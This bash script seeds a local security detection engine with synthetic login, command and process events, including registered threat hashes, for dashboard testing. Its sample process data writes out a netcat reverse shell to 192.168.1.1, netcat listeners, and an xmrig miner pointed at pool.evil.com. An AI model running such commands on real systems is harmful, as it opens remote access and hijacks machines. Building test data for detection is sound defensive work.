#!/usr/bin/env bash
# Send sample events to the Detection Engine so the dashboard has data.
# Includes normal and abnormal behaviour (auth failures, known-bad command, suspicious processes).
# Timestamps are relative to NOW so data always falls within dashboard query windows.
# Run with: ./scripts/seed_events.sh

set -e
ENGINE_URL="${ENGINE_URL:-http://localhost:8000}"
API_KEY="${ENGINE_API_KEY:-}"
ENDPOINT="${ENGINE_URL}/api/v1/events"
ADMIN_ENDPOINT="${ENGINE_URL}/api/v1/admin/threat-hashes"

TODAY=$(date -u +%Y-%m-%dT)

THREAT_HASH_1="7a1b2c3d4e5f6078901234567890abcdef1234567890abcdef1234567890abcd"
THREAT_HASH_2="b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234567890"

HEADERS=(-H "Content-Type: application/json")
if [[ -n "$API_KEY" ]]; then
  HEADERS+=(-H "Authorization: Bearer $API_KEY")
fi

echo "Adding threat hashes so malicious command events trigger alerts..."
curl -s -X POST "$ADMIN_ENDPOINT" "${HEADERS[@]}" -d "{\"command_hash\":\"$THREAT_HASH_1\",\"category\":\"destructive\"}" > /dev/null || true
curl -s -X POST "$ADMIN_ENDPOINT" "${HEADERS[@]}" -d "{\"command_hash\":\"$THREAT_HASH_2\",\"category\":\"reverse_shell\"}" > /dev/null || true

echo "Sending normal + abnormal events (14 users with malicious activity) to $ENDPOINT ..."

curl -s -X POST "$ENDPOINT" "${HEADERS[@]}" -d "[
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"rohan\",\"timestamp\":\"${TODAY}08:00:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"login\",\"service\":\"sshd\",\"success\":true}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"bob\",\"timestamp\":\"${TODAY}08:05:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"login\",\"service\":\"sshd\",\"success\":true}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"unknown\",\"timestamp\":\"${TODAY}08:10:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"alice\",\"timestamp\":\"${TODAY}08:15:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"a1b2c3d4e5f6789012345678901234567890abcdef\",\"command_length\":10}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"bob\",\"timestamp\":\"${TODAY}08:20:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"b2c3d4e5f6789012345678901234567890abcdef01\",\"command_length\":15}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"alice\",\"timestamp\":\"${TODAY}08:25:00Z\",\"source\":\"process\",\"payload\":{\"pid\":1001,\"exe\":\"/usr/bin/bash\",\"argv\":[\"bash\"],\"parent_pid\":1000,\"start_time\":1730000000.0}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"bob\",\"timestamp\":\"${TODAY}08:30:00Z\",\"source\":\"process\",\"payload\":{\"pid\":1002,\"exe\":\"/usr/bin/python3\",\"argv\":[\"python3\",\"-m\",\"agent.main\"],\"parent_pid\":1000,\"start_time\":1730000100.0}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"root\",\"timestamp\":\"${TODAY}09:00:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"root\",\"timestamp\":\"${TODAY}09:01:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"root\",\"timestamp\":\"${TODAY}09:02:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"admin\",\"timestamp\":\"${TODAY}03:00:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"bob\",\"timestamp\":\"${TODAY}09:10:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_1\",\"command_length\":8}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"root\",\"timestamp\":\"${TODAY}09:15:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2001,\"exe\":\"/usr/bin/nc\",\"argv\":[\"nc\",\"-l\",\"-p\",\"4444\"],\"parent_pid\":1000,\"start_time\":1730001000.0}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"alice\",\"timestamp\":\"${TODAY}09:20:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2002,\"exe\":\"/tmp/crypto_miner.sh\",\"argv\":[\"/tmp/crypto_miner.sh\"],\"parent_pid\":1001,\"start_time\":1730001300.0}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"marcus\",\"timestamp\":\"${TODAY}09:30:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"marcus\",\"timestamp\":\"${TODAY}09:31:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"marcus\",\"timestamp\":\"${TODAY}09:32:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_1\",\"command_length\":8}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"jordan\",\"timestamp\":\"${TODAY}09:40:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"jordan\",\"timestamp\":\"${TODAY}09:41:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2003,\"exe\":\"/tmp/backdoor.sh\",\"argv\":[\"/tmp/backdoor.sh\"],\"parent_pid\":1000,\"start_time\":1730002000.0}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"skyler\",\"timestamp\":\"${TODAY}09:50:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_2\",\"command_length\":12}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"reese\",\"timestamp\":\"${TODAY}10:00:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"reese\",\"timestamp\":\"${TODAY}10:01:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"reese\",\"timestamp\":\"${TODAY}10:02:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"phoenix\",\"timestamp\":\"${TODAY}10:10:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2004,\"exe\":\"/usr/bin/nc\",\"argv\":[\"nc\",\"-e\",\"/bin/bash\",\"192.168.1.1\",\"4444\"],\"parent_pid\":1000,\"start_time\":1730002500.0}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"shadow\",\"timestamp\":\"${TODAY}10:20:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_1\",\"command_length\":8}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"shadow\",\"timestamp\":\"${TODAY}10:21:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"venom\",\"timestamp\":\"${TODAY}10:30:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"venom\",\"timestamp\":\"${TODAY}10:31:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"venom\",\"timestamp\":\"${TODAY}10:32:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2005,\"exe\":\"/var/tmp/xmrig\",\"argv\":[\"/var/tmp/xmrig\",\"-o\",\"pool.evil.com\"],\"parent_pid\":1000,\"start_time\":1730002800.0}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"reaper\",\"timestamp\":\"${TODAY}10:40:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_2\",\"command_length\":12}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"ghost\",\"timestamp\":\"${TODAY}02:30:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"process\",\"machine_id\":\"local-machine\",\"user\":\"ghost\",\"timestamp\":\"${TODAY}02:31:00Z\",\"source\":\"process\",\"payload\":{\"pid\":2006,\"exe\":\"/usr/bin/nc\",\"argv\":[\"nc\",\"-lvp\",\"9999\"],\"parent_pid\":1000,\"start_time\":1729999800.0}},
  {\"event_type\":\"auth\",\"machine_id\":\"local-machine\",\"user\":\"phantom\",\"timestamp\":\"${TODAY}04:00:00Z\",\"source\":\"auth\",\"payload\":{\"action\":\"failure\",\"service\":\"sshd\",\"success\":false}},
  {\"event_type\":\"command\",\"machine_id\":\"local-machine\",\"user\":\"phantom\",\"timestamp\":\"${TODAY}04:01:00Z\",\"source\":\"command\",\"payload\":{\"command_hash\":\"$THREAT_HASH_1\",\"command_length\":8}}
]"

echo ""
echo "Done. Refresh the dashboard at http://localhost:5173"
